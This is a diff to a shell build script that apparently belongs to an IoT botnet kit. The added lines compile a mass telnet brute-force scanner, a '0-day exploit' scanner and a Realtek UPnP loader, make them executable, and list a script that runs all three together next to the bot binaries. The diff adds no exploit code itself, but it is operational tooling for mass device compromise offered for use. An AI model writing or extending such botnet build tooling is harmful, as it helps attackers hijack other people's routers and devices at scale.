@@ -56,6 +56,22 @@ go build -o scanListen scanListen.go || { echo "Failed to build scanListen"; exi
 echo "[+] scanListen built successfully"
 
 echo ""
+echo "[*] Building Extra Scanners (Server-Side)..."
+cd extrascanners
+go build -o ../extrascanners/telnet-scanner telnet-scanner.go
+go build -o ../extrascanners/0day-exploit 0day-exploit.go
+go build -o ../extrascanners/realtek-loader realtek-loader.go
+chmod +x ../extrascanners/telnet-scanner ../extrascanners/0day-exploit ../extrascanners/realtek-loader ../extrascanners/run-all.sh
+cd ..
+echo "[+] Extra Scanners built successfully"
+echo ""
+echo "[*] Extra Scanners location: ./extrascanners/"
+echo "    - telnet-scanner   (Mass telnet brute-force)"
+echo "    - 0day-exploit     (0-day exploit scanner)"
+echo "    - realtek-loader   (Realtek UPnP loader)"
+echo "    - run-all.sh       (Run all 3 simultaneously)"
+
+echo ""
 echo "[*] Building Bot binaries..."
 
 # Bot build flags
